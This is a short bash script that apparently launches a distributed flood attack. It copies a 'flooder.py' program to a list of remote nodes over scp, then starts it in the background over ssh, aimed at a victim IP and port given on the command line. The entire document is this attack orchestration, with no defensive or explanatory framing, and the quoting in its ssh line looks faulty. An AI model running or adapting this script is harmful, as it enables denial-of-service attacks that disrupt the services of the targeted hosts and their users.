#!/bin/bash

NODES=$#
VICTIM=$1
shift
VICTIMPORT=$1
shift

NODES=$(($NODES - 2))

for i in `seq $NODES`
do
  scp flooder.py rai@$1:~/
  ssh -t rai@$1 'nohup python flooder.py &'$VICTIM' '$VICTIMPORT
  shift
done
